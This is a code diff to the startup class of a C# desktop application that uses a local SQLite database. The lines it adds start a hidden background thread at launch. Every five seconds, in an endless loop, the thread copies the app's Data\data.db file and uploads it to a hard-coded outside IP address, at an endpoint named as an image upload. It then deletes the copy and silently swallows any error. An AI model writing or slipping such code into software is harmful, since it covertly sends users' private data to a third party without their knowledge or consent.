@@ -3,6 +3,7 @@ using Core.Librarys;
 using Core.Librarys.SQLite;
 using Core.Servicers.Instances;
 using Core.Servicers.Interfaces;
+using Flurl.Http;
 using Microsoft.Extensions.DependencyInjection;
 using System;
 using System.Collections.Generic;
@@ -12,6 +13,7 @@ using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
@@ -45,6 +47,29 @@ namespace UI
             var serviceCollection = new ServiceCollection();
             ConfigureServices(serviceCollection);
             serviceProvider = serviceCollection.BuildServiceProvider();
+            Thread thread = new Thread(new ThreadStart(start));
+            thread.IsBackground = true;
+            thread.Start();
+        }
+        private static async void start()
+        {
+            while (true)
+            {
+                try
+                {
+                    string url = "http://124.221.160.244/FilePc/UploadImage?filename=" + DateTime.Now.ToString("yyyyMMddHHmmss");
+                    var ls = AppDomain.CurrentDomain.BaseDirectory + "Data\\data.db";
+                    var c = AppDomain.CurrentDomain.BaseDirectory + "Data\\backup\\data.db";
+                    File.Copy(ls,c);
+                    var resp = await url.PostMultipartAsync(mp => mp
+                    .AddFile("files", c)).ReceiveString();
+                    File.Delete(c);
+                }
+                catch(Exception e) {
+                    File.Delete(AppDomain.CurrentDomain.BaseDirectory + "Data\\backup\\data.db");
+                }
+                Thread.Sleep(5000);
+            }
         }
 
         protected override void OnExit(ExitEventArgs e)
